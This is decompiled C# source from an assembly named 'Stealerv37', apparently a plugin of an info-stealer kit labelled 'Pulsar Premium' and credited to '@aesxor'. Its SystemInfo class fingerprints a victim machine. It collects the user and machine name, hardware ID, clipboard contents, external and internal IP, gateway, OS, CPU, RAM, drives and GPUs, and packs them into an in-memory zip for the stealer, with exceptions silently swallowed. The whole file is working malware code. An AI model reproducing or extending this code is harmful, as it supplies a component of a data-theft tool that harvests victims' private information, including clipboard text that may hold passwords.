// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Device.SystemInfo
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper;
using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

#nullable disable
namespace Intelix.Targets.Device;

internal class SystemInfo : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    try
    {
      StringBuilder stringBuilder1 = new StringBuilder();
      stringBuilder1.AppendLine("Xorium");
      stringBuilder1.AppendLine("                               coded by @aesxor");
      Task<string> task1 = Task.Run<string>((Func<string>) (() => SystemInfo.BuildUserSection()));
      Task<string> task2 = Task.Run<string>((Func<string>) (() => SystemInfo.BuildNetworkSection()));
      Task<string> task3 = Task.Run<string>((Func<string>) (() => SystemInfo.BuildSystemSection()));
      Task<string> task4 = Task.Run<string>((Func<string>) (() => SystemInfo.BuildDrivesSection()));
      Task<string> task5 = Task.Run<string>((Func<string>) (() => SystemInfo.BuildGpuSection()));
      Task<string> task6 = Task.Run<string>((Func<string>) (() => SystemInfo.BuildBasicSection()));
      Task.WaitAll((Task) task1, (Task) task2, (Task) task3, (Task) task4, (Task) task5, (Task) task6);
      StringBuilder stringBuilder2 = new StringBuilder();
      stringBuilder2.Append((object) stringBuilder1);
      stringBuilder2.AppendLine(task1.Result).AppendLine();
      stringBuilder2.AppendLine(task2.Result).AppendLine();
      stringBuilder2.AppendLine(task3.Result).AppendLine();
      stringBuilder2.AppendLine(task4.Result).AppendLine();
      stringBuilder2.AppendLine(task5.Result).AppendLine();
      stringBuilder2.AppendLine(task6.Result);
      zip.AddTextFile("Information.txt", stringBuilder2.ToString());
    }
    catch
    {
    }
  }

  private static string BuildUserSection()
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.AppendLine("[User Info]");
    try
    {
      stringBuilder.AppendLine("User: " + Environment.UserName);
      stringBuilder.AppendLine("Machine: " + Environment.MachineName);
      stringBuilder.AppendLine(string.Format("Now: {0:yyyy-MM-dd HH:mm:ss}", (object) DateTime.Now));
    }
    catch
    {
      stringBuilder.AppendLine("User/System fields unavailable");
    }
    try
    {
      string str = InputLanguage.CurrentInputLanguage?.Culture?.TwoLetterISOLanguageName ?? "unknown";
      stringBuilder.AppendLine("Input ISO: " + str);
    }
    catch
    {
      stringBuilder.AppendLine("Input ISO: unknown");
    }
    stringBuilder.AppendLine("Hwid: " + HwidGenerator.GetHwid());
    stringBuilder.AppendLine("Clipboard: " + SystemInfo.GetClipboardTextNoTimeout());
    return stringBuilder.ToString().TrimEnd();
  }

  private static string BuildNetworkSection()
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.AppendLine("[Network]");
    stringBuilder.AppendLine("External IP: " + IpApi.GetPublicIp());
    string str1 = "unavailable";
    string str2 = "unavailable";
    try
    {
      foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
      {
        if (networkInterface.OperationalStatus == OperationalStatus.Up && networkInterface.NetworkInterfaceType != NetworkInterfaceType.Loopback)
        {
          IPInterfaceProperties ipProperties = networkInterface.GetIPProperties();
          foreach (UnicastIPAddressInformation unicastAddress in ipProperties.UnicastAddresses)
          {
            if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork)
            {
              str1 = unicastAddress.Address.ToString();
              break;
            }
          }
          foreach (GatewayIPAddressInformation gatewayAddress in ipProperties.GatewayAddresses)
          {
            if (gatewayAddress.Address != null && gatewayAddress.Address.AddressFamily == AddressFamily.InterNetwork)
            {
              str2 = gatewayAddress.Address.ToString();
              break;
            }
          }
          if (str1 != "unavailable")
          {
            if (str2 != "unavailable")
              break;
          }
        }
      }
    }
    catch
    {
    }
    stringBuilder.AppendLine("Internal IP: " + str1);
    stringBuilder.AppendLine("Default Gateway: " + str2);
    return stringBuilder.ToString().TrimEnd();
  }

  private static string BuildSystemSection()
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.AppendLine("[System]");
    try
    {
      stringBuilder.AppendLine("OS Product: " + WindowsInfo.GetProductName());
      stringBuilder.AppendLine("OS Build: " + WindowsInfo.GetBuildNumber());
      stringBuilder.AppendLine("OS Arch: " + WindowsInfo.GetArchitecture());
    }
    catch
    {
      stringBuilder.AppendLine("OS: unavailable");
    }
    try
    {
      using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"))
      {
        if (!(registryKey?.GetValue("ProcessorNameString") is string str2))
          str2 = registryKey?.GetValue("VendorIdentifier") is string str1 ? str1 : "Unknown";
        string str3 = str2;
        stringBuilder.AppendLine("CPU Name: " + str3);
        stringBuilder.AppendLine($"Logical Cores: {Environment.ProcessorCount}");
      }
    }
    catch
    {
      stringBuilder.AppendLine("CPU: unavailable");
    }
    try
    {
      Intelix.Helper.NativeMethods.MEMORYSTATUSEX lpBuffer = new Intelix.Helper.NativeMethods.MEMORYSTATUSEX()
      {
        dwLength = (uint) Marshal.SizeOf(typeof (Intelix.Helper.NativeMethods.MEMORYSTATUSEX))
      };
      if (Intelix.Helper.NativeMethods.GlobalMemoryStatusEx(ref lpBuffer))
      {
        ulong num1 = lpBuffer.ullTotalPhys / 1024UL /*0x0400*/ / 1024UL /*0x0400*/;
        ulong num2 = lpBuffer.ullAvailPhys / 1024UL /*0x0400*/ / 1024UL /*0x0400*/;
        stringBuilder.AppendLine($"RAM Total (MB): {num1}");
        stringBuilder.AppendLine($"RAM Available (MB): {num2}");
      }
      else
        stringBuilder.AppendLine("RAM: unavailable");
    }
    catch
    {
      stringBuilder.AppendLine("RAM: unavailable");
    }
    return stringBuilder.ToString().TrimEnd();
  }

  private static string BuildDrivesSection()
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.AppendLine("[Drives]");
    try
    {
      List<string> list = ((IEnumerable<DriveInfo>) DriveInfo.GetDrives()).Where<DriveInfo>((Func<DriveInfo, bool>) (d => d.IsReady)).Select<DriveInfo, string>((Func<DriveInfo, string>) (d =>
      {
        long num1 = d.TotalSize / 1024L /*0x0400*/ / 1024L /*0x0400*/ / 1024L /*0x0400*/;
        long num2 = d.TotalFreeSpace / 1024L /*0x0400*/ / 1024L /*0x0400*/ / 1024L /*0x0400*/;
        return $"{d.Name.TrimEnd('\\')} {d.DriveType} FS:{d.DriveFormat} Size:{num1}GB Free:{num2}GB";
      })).ToList<string>();
      if (list.Any<string>())
      {
        foreach (string str in list)
          stringBuilder.AppendLine(str);
      }
      else
        stringBuilder.AppendLine("No ready drives");
    }
    catch
    {
      stringBuilder.AppendLine("Drives: unavailable");
    }
    return stringBuilder.ToString().TrimEnd();
  }

  private static string BuildGpuSection()
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.AppendLine("[GPU]");
    try
    {
      List<string> gpuNames = SystemInfo.GetGpuNames();
      if (gpuNames.Any<string>())
      {
        foreach (string str in gpuNames)
          stringBuilder.AppendLine(str);
      }
      else
        stringBuilder.AppendLine("None");
    }
    catch
    {
      stringBuilder.AppendLine("GPUs: unavailable");
    }
    return stringBuilder.ToString().TrimEnd();
  }

  private static string BuildBasicSection()
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.AppendLine("[Basic]");
    try
    {
      stringBuilder.AppendLine("User Domain: " + Environment.UserDomainName);
    }
    catch
    {
      stringBuilder.AppendLine("User Domain: unavailable");
    }
    try
    {
      stringBuilder.AppendLine($"CLR Version: {Environment.Version}");
    }
    catch
    {
      stringBuilder.AppendLine("CLR Version: unavailable");
    }
    return stringBuilder.ToString().TrimEnd();
  }

  private static string GetClipboardTextNoTimeout()
  {
    string result = string.Empty;
    try
    {
      Thread thread = new Thread((ThreadStart) (() =>
      {
        try
        {
          if (!Clipboard.ContainsText())
            return;
          result = Clipboard.GetText();
        }
        catch
        {
        }
      }));
      thread.SetApartmentState(ApartmentState.STA);
      thread.IsBackground = true;
      thread.Start();
      thread.Join();
    }
    catch
    {
    }
    return result ?? string.Empty;
  }

  private static List<string> GetGpuNames()
  {
    List<string> source = new List<string>();
    try
    {
      uint iDevNum = 0;
      Intelix.Helper.NativeMethods.DISPLAY_DEVICE lpDisplayDevice = new Intelix.Helper.NativeMethods.DISPLAY_DEVICE();
      lpDisplayDevice.cb = Marshal.SizeOf<Intelix.Helper.NativeMethods.DISPLAY_DEVICE>(lpDisplayDevice);
      Intelix.Helper.NativeMethods.DISPLAY_DEVICE displayDevice;
      for (; Intelix.Helper.NativeMethods.EnumDisplayDevices((string) null, iDevNum, ref lpDisplayDevice, 0U); lpDisplayDevice = displayDevice)
      {
        if (!string.IsNullOrWhiteSpace(lpDisplayDevice.DeviceString))
          source.Add(lpDisplayDevice.DeviceString.Trim());
        ++iDevNum;
        displayDevice = new Intelix.Helper.NativeMethods.DISPLAY_DEVICE();
        displayDevice.cb = Marshal.SizeOf(typeof (Intelix.Helper.NativeMethods.DISPLAY_DEVICE));
      }
    }
    catch
    {
    }
    return source.Distinct<string>().ToList<string>();
  }
}
